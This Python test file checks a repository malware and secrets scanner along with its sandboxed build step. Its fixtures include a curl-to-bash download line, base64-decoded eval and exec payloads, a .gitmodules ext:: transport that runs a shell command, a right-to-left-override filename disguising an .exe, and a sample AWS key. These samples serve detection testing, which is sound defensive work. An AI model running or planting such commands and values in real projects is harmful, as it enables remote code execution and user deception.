import importlib.util
import json as json_module
import subprocess
from pathlib import Path
from unittest.mock import patch

_SCRIPT_PATH = Path(__file__).resolve().parent.parent / "vm_scripts" / "analyze.py"


def _load_analyze_module():
    spec = importlib.util.spec_from_file_location("analyze", _SCRIPT_PATH)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


analyze = _load_analyze_module()


def _init_repo(tmp_path: Path) -> Path:
    repo_dir = tmp_path / "repo"
    repo_dir.mkdir()
    subprocess.run(["git", "init", "-q"], cwd=repo_dir, check=True)
    return repo_dir


def test_scan_malicious_patterns_finds_curl_pipe_bash(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "install.sh").write_text(
        "#!/bin/sh\ncurl https://example.com/payload.sh | bash\n"
    )

    findings = analyze.scan_malicious_patterns(repo_dir)

    assert len(findings) == 1
    assert findings[0]["rule"] == "curl_pipe_shell"
    assert findings[0]["file"] == "install.sh"
    assert findings[0]["line"] == 2
    assert "curl" in findings[0]["snippet"]


def test_scan_malicious_patterns_finds_js_eval_decoded(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "postinstall.js").write_text(
        "eval(Buffer.from('c29tZSBjb2Rl', 'base64').toString());\n"
    )

    findings = analyze.scan_malicious_patterns(repo_dir)

    assert len(findings) == 1
    assert findings[0]["rule"] == "js_eval_decoded"
    assert findings[0]["file"] == "postinstall.js"


def test_scan_malicious_patterns_finds_python_exec_base64(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "setup.py").write_text(
        "import base64\nexec(base64.b64decode(b'cHJpbnQoMSk='))\n"
    )

    findings = analyze.scan_malicious_patterns(repo_dir)

    assert len(findings) == 1
    assert findings[0]["rule"] == "python_exec_base64"


def test_scan_malicious_patterns_ignores_clean_files(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "main.py").write_text("print('hello world')\n")

    findings = analyze.scan_malicious_patterns(repo_dir)

    assert findings == []


def test_scan_malicious_patterns_ignores_binary_files(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "payload.bin").write_bytes(
        b"curl https://example.com/x | bash\x00\x01\x02"
    )

    findings = analyze.scan_malicious_patterns(repo_dir)

    assert findings == []


def test_scan_malicious_patterns_ignores_dot_git_directory(tmp_path):
    repo_dir = _init_repo(tmp_path)
    fake_hook_dir = repo_dir / ".git" / "hooks"
    fake_hook_dir.mkdir(parents=True, exist_ok=True)
    (fake_hook_dir / "fake-hook").write_text("curl https://example.com/x | bash\n")

    findings = analyze.scan_malicious_patterns(repo_dir)

    assert findings == []


def test_scan_git_specifics_finds_gitmodules_ext_transport(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / ".gitmodules").write_text(
        '[submodule "evil"]\n'
        "\tpath = evil\n"
        "\turl = ext::sh -c 'touch /tmp/pwned'\n"
    )

    findings = analyze.scan_git_specifics(repo_dir)

    rules = [f["rule"] for f in findings]
    assert "gitmodules_ext_transport" in rules


def test_scan_git_specifics_finds_gitattributes_custom_filter(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / ".gitattributes").write_text("*.secret filter=my-custom-filter\n")

    findings = analyze.scan_git_specifics(repo_dir)

    rules = [f["rule"] for f in findings]
    assert "gitattributes_custom_filter" in rules


def test_scan_git_specifics_finds_nested_git_path(tmp_path):
    repo_dir = _init_repo(tmp_path)
    nested = repo_dir / "vendor" / ".git"
    nested.mkdir(parents=True)

    findings = analyze.scan_git_specifics(repo_dir)

    rules = [f["rule"] for f in findings]
    assert "nested_git_path" in rules
    nested_finding = next(f for f in findings if f["rule"] == "nested_git_path")
    assert nested_finding["file"] == "vendor/.git"


def test_scan_git_specifics_finds_suspicious_filename_characters(tmp_path):
    repo_dir = _init_repo(tmp_path)
    suspicious_name = "invoice‮gpj.exe"
    (repo_dir / suspicious_name).write_text("not actually an image")

    findings = analyze.scan_git_specifics(repo_dir)

    rules = [f["rule"] for f in findings]
    assert "suspicious_filename_characters" in rules


def test_scan_git_specifics_clean_repo_has_no_findings(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "README.md").write_text("# hello\n")

    findings = analyze.scan_git_specifics(repo_dir)

    assert findings == []


def test_scan_secrets_finds_aws_key(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "config.py").write_text(
        "AWS_KEY = 'AKIAIOSFODNN7EXAMPLE'\n"
    )

    findings = analyze.scan_secrets(repo_dir)

    assert len(findings) == 1
    assert findings[0]["rule"].startswith("secret_")
    assert findings[0]["file"] == "config.py"
    assert findings[0]["line"] == 1
    assert findings[0]["snippet"] == ""


def test_scan_secrets_clean_repo_has_no_findings(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "README.md").write_text("# hello\n")

    findings = analyze.scan_secrets(repo_dir)

    assert findings == []


def test_scan_secrets_ignores_dot_git_directory(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "README.md").write_text("# hello\n")
    (repo_dir / ".git" / "COMMIT_EDITMSG").write_text(
        "Add config\n\nAWS_KEY = 'AKIAIOSFODNN7EXAMPLE'\n"
    )

    findings = analyze.scan_secrets(repo_dir)

    assert findings == []


def test_scan_secrets_marks_not_executed_when_tool_missing(tmp_path):
    repo_dir = _init_repo(tmp_path)

    with patch.object(
        analyze.subprocess, "run", side_effect=FileNotFoundError("no such file")
    ):
        findings = analyze.scan_secrets(repo_dir)

    assert len(findings) == 1
    assert findings[0]["rule"] == "scanner_not_executed"


def test_resolve_detect_secrets_command_finds_venv_sibling_binary():
    with patch.object(analyze.shutil, "which", return_value=None):
        resolved = analyze._resolve_detect_secrets_command()

    expected = str(Path(analyze.sys.executable).parent / "detect-secrets")
    assert resolved == expected
    assert Path(resolved).is_file()


def test_scan_secrets_finds_aws_key_when_not_on_path(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "config.py").write_text(
        "AWS_KEY = 'AKIAIOSFODNN7EXAMPLE'\n"
    )

    with patch.object(analyze.shutil, "which", return_value=None):
        findings = analyze.scan_secrets(repo_dir)

    assert len(findings) == 1
    assert findings[0]["rule"].startswith("secret_")
    assert findings[0]["file"] == "config.py"
    assert findings[0]["line"] == 1


def test_run_writes_combined_json_report(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "install.sh").write_text("curl https://example.com/x | bash\n")
    output_path = tmp_path / "report.json"

    analyze.run(repo_dir, output_path)

    payload = json_module.loads(output_path.read_text())
    assert set(payload.keys()) == {"malicious_patterns", "git_findings", "secrets"}
    assert len(payload["malicious_patterns"]) == 1
    assert payload["malicious_patterns"][0]["rule"] == "curl_pipe_shell"
    assert payload["git_findings"] == []


def test_cut_network_applies_iptables_rules_successfully():
    with patch.object(analyze.subprocess, "run") as mock_run:
        mock_run.return_value.returncode = 0
        mock_run.return_value.stderr = ""

        result = analyze.cut_network()

    assert result == {"applied": True, "error": ""}
    call_args = mock_run.call_args
    command = call_args.args[0]
    assert command[0] == "sudo"
    assert "iptables" in " ".join(command)


def test_cut_network_reports_failure_when_iptables_fails():
    with patch.object(analyze.subprocess, "run") as mock_run:
        mock_run.return_value.returncode = 1
        mock_run.return_value.stderr = "iptables: command not found"

        result = analyze.cut_network()

    assert result["applied"] is False
    assert "command not found" in result["error"]


def test_detect_build_command_finds_npm_for_package_json(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "package.json").write_text('{"name": "example"}')

    command = analyze.detect_build_command(repo_dir)

    assert command == ["npm", "install"]


def test_detect_build_command_finds_pip_for_requirements_txt(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "requirements.txt").write_text("requests==2.31.0\n")

    command = analyze.detect_build_command(repo_dir)

    assert command == ["pip3", "install", "-r", "requirements.txt"]


def test_detect_build_command_finds_pip_for_setup_py(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "setup.py").write_text("from setuptools import setup\nsetup()\n")

    command = analyze.detect_build_command(repo_dir)

    assert command == ["pip3", "install", "."]


def test_detect_build_command_returns_none_for_unrecognized_repo(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "README.md").write_text("# hello\n")

    command = analyze.detect_build_command(repo_dir)

    assert command is None


import subprocess as subprocess_module
from unittest.mock import MagicMock


def test_run_dynamic_step_skips_when_no_build_command_detected(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "README.md").write_text("# hello\n")

    result = analyze.run_dynamic_step(repo_dir)

    assert result == {
        "attempted": False,
        "command": None,
        "exit_code": None,
        "timed_out": False,
        "network_connect_attempts": [],
    }


def test_run_dynamic_step_runs_detected_command_and_parses_telemetry(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "requirements.txt").write_text("requests==2.31.0\n")
    telemetry_path = repo_dir.parent / "telemetry.log"
    telemetry_path.write_text(
        "connect(3, {sa_family=AF_INET, sin_port=htons(443), "
        'sin_addr=inet_addr("93.184.216.34")}, 16) = -1 ECONNREFUSED\n'
        "openat(AT_FDCWD, \"/etc/passwd\", O_RDONLY) = 3\n"
    )

    with patch.object(analyze.subprocess, "run") as mock_run:

        def run_side_effect(command, **kwargs):
            result = MagicMock()
            if command[:2] == ["sudo", "bash"]:
                result.returncode = 0
                result.stderr = ""
            else:
                result.returncode = 0
            return result

        mock_run.side_effect = run_side_effect

        result = analyze.run_dynamic_step(repo_dir, timeout=60.0)

    assert result["attempted"] is True
    assert result["command"] == ["pip3", "install", "-r", "requirements.txt"]
    assert result["exit_code"] == 0
    assert result["timed_out"] is False
    assert result["network_cutoff_applied"] is True
    assert len(result["network_connect_attempts"]) == 1
    assert "connect(" in result["network_connect_attempts"][0]


def test_run_dynamic_step_marks_timed_out_on_timeout(tmp_path):
    repo_dir = _init_repo(tmp_path)
    (repo_dir / "package.json").write_text('{"name": "example"}')

    with patch.object(analyze.subprocess, "run") as mock_run:

        def run_side_effect(command, **kwargs):
            if command[:2] == ["sudo", "bash"]:
                result = MagicMock()
                result.returncode = 0
                result.stderr = ""
                return result
            raise subprocess_module.TimeoutExpired(cmd=command, timeout=60.0)

        mock_run.side_effect = run_side_effect

        result = analyze.run_dynamic_step(repo_dir, timeout=60.0)

    assert result["attempted"] is True
    assert result["timed_out"] is True
    assert result["exit_code"] is None
